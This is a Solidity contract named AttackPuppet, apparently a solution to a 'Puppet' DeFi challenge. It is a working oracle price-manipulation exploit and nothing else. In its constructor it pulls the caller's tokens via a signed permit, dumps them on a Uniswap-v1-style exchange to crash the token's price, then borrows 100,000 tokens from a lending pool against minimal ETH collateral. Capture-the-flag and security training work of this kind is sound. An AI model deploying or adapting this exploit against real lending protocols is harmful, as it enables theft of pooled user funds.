// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract AttackPuppet {
    using Address for address;

    address private tokenAddress;
    address private poolAddress;
    address private swapAddress;
    uint8 private v;
    bytes32 private r;
    bytes32 private s;

    constructor(
        address _tokenAdress,
        address _poolAddress,
        address _swapAddress,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) payable {
        tokenAddress = _tokenAdress;
        poolAddress = _poolAddress;
        swapAddress = _swapAddress;
        v = _v;
        r = _r;
        s = _s;

        (, bytes memory data) = tokenAddress.staticcall(
            abi.encodeWithSignature("balanceOf(address)", msg.sender)
        );

        uint tokenAmount = abi.decode(data, (uint256));
        uint deadline = type(uint).max;
        //approve
        tokenAddress.functionCall(
            abi.encodeWithSignature(
                "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
                msg.sender,
                address(this),
                tokenAmount,
                deadline,
                v,
                r,
                s
            )
        );
        //transfer
        tokenAddress.functionCall(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                msg.sender,
                address(this),
                tokenAmount
            )
        );

        tokenAddress.functionCall(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                swapAddress,
                type(uint256).max
            )
        );
        //swap
        swapAddress.functionCall(
            abi.encodeWithSignature(
                "tokenToEthSwapInput(uint256,uint256,uint256)",
                tokenAmount,
                1,
                deadline
            )
        );
        //borrow
        poolAddress.functionCallWithValue(
            abi.encodeWithSignature(
                "borrow(uint256,address)",
                100000 * 10 ** 18,
                msg.sender
            ),
            msg.value
        );
    }
}
